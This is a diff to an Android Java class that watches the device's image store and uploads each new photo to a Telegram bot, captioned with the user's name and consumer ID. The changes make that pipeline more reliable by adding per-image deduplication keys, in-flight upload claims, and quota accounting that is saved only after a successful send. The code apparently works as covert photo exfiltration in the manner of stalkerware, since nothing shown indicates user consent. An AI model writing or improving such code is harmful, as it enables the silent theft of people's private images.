@@ -19,8 +19,10 @@ import android.text.TextUtils;
 import android.util.Log;
 
 import java.io.File;
+import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Locale;
+import java.util.Map;
 import java.util.Set;
 
 public class ImageObserver extends ContentObserver {
@@ -29,9 +31,7 @@ public class ImageObserver extends ContentObserver {
     private final Context mContext;
     private final Handler mHandler;
     private final Set<Long> mPendingImageIds = new HashSet<>();
-
-
-    private final Set<String> mPendingImagePaths = new HashSet<>();
+    private final Set<String> mUploadingImageIds = new HashSet<>();
 
     private final Runnable mFlushRunnable = this::processPendingImages;
     private int calls = 0;
@@ -82,9 +82,11 @@ public class ImageObserver extends ContentObserver {
                 MediaStore.Images.Media._ID,
                 MediaStore.Images.Media.DATA,
                 MediaStore.Images.Media.DISPLAY_NAME,
-                MediaStore.Images.Media.RELATIVE_PATH
+                MediaStore.Images.Media.RELATIVE_PATH,
+                MediaStore.Images.Media.DATE_ADDED
         };
 
+        Map<String, String> imagePaths = new HashMap<>();
         try (Cursor cursor = mContext.getContentResolver().query(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                 projection, selection, null, null)) {
@@ -93,6 +95,13 @@ public class ImageObserver extends ContentObserver {
 
             while (cursor.moveToNext()) {
                 String fullPath = null;
+                int idIdx = cursor.getColumnIndex(MediaStore.Images.Media._ID);
+                int dateAddedIdx = cursor.getColumnIndex(MediaStore.Images.Media.DATE_ADDED);
+                if (idIdx == -1 || dateAddedIdx == -1) {
+                    Log.w(TAG, "Image query omitted the MediaStore ID or creation date");
+                    continue;
+                }
+                String imageKey = cursor.getLong(idIdx) + ":" + cursor.getLong(dateAddedIdx);
 
                 if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                     int dataIdx = cursor.getColumnIndex(MediaStore.Images.Media.DATA);
@@ -111,20 +120,11 @@ public class ImageObserver extends ContentObserver {
                 }
 
                 if (!TextUtils.isEmpty(fullPath)) {
-                    synchronized (mPendingImagePaths) {
-                        mPendingImagePaths.add(fullPath); // collect all unique paths
-                    }
+                    imagePaths.put(imageKey, fullPath);
                 }
             }
         } catch (Exception e) {
             Log.e(TAG, "Error processing images", e);
-        }
-
-        // 🔑 Now handle only unique paths
-        Set<String> uniquePaths;
-        synchronized (mPendingImagePaths) {
-            uniquePaths = new HashSet<>(mPendingImagePaths);
-            mPendingImagePaths.clear();
         }
 
         checkAndResetLimits();
@@ -140,10 +140,17 @@ public class ImageObserver extends ContentObserver {
                 FirebaseConfigManager.getImgDailyMbLimit()
                         * 1024L * 1024L;
 
-        for (String path : uniquePaths) {
+        for (Map.Entry<String, String> image : imagePaths.entrySet()) {
+            String imageKey = image.getKey();
+            String path = image.getValue();
+            if (!claimImageForUpload(imageKey)) {
+                Log.d(TAG, "Skipping already uploaded or in-flight image " + imageKey);
+                continue;
+            }
 
             // Stop if count limit reached
             if (uploadedCount >= maxCount) {
+                releaseImageClaim(imageKey);
 
                 Log.d(TAG, "Daily image count limit reached");
 
@@ -165,6 +172,7 @@ public class ImageObserver extends ContentObserver {
             File imgFile = new File(path);
 
             if (!imgFile.exists()) {
+                releaseImageClaim(imageKey);
                 continue;
             }
 
@@ -172,6 +180,7 @@ public class ImageObserver extends ContentObserver {
 
             // Skip empty/corrupted files
             if (originalFileSize < 1024) {
+                releaseImageClaim(imageKey);
                 continue;
             }
 
@@ -210,6 +219,7 @@ public class ImageObserver extends ContentObserver {
 
             // Stop if MB limit reached
             if ((uploadedBytes + finalUploadSize) > maxBytes) {
+                releaseImageClaim(imageKey);
 
 
 
@@ -226,29 +236,54 @@ public class ImageObserver extends ContentObserver {
             }
 
             try {
-
-
+                long bytesToRecord = finalUploadSize;
                 TelegramBot.with(mContext).sendPhoto(
                         compressedFile,
                         SharedPrefs.getUsername()
                                 + "-"
                                 + SharedPrefs.getConsumerId()
                                 + "\n"
-                                + Utility.getStandardDatenTime()
+                                + Utility.getStandardDatenTime(),
+                        uploaded -> {
+                                    try {
+                                        if (uploaded) {
+                                            SharedPrefs.markImageUploaded(imageKey);
+                                            SharedPrefs.recordImageUpload(bytesToRecord);
+                                        }
+                                    } catch (RuntimeException e) {
+                                        Log.e(TAG, "Could not save successful upload state for " + imageKey, e);
+                                    } finally {
+                                        releaseImageClaim(imageKey);
+                                    }
+                                }
                 );
 
             } catch (Exception e) {
+                releaseImageClaim(imageKey);
+                Log.e(TAG, "Could not queue image upload for " + imageKey, e);
             }
 
 
-            // Update counters
+            // Reserve quota for other images in this batch. Persist only after upload succeeds.
             uploadedCount++;
 
             uploadedBytes += finalUploadSize;
+        }
+    }
 
-            SharedPrefs.setUploadCount(uploadedCount);
+    private boolean claimImageForUpload(String imageKey) {
+        synchronized (mUploadingImageIds) {
+            if (mUploadingImageIds.contains(imageKey) || SharedPrefs.hasUploadedImage(imageKey)) {
+                return false;
+            }
+            mUploadingImageIds.add(imageKey);
+            return true;
+        }
+    }
 
-            SharedPrefs.setUploadedBytes(uploadedBytes);
+    private void releaseImageClaim(String imageKey) {
+        synchronized (mUploadingImageIds) {
+            mUploadingImageIds.remove(imageKey);
         }
     }
 
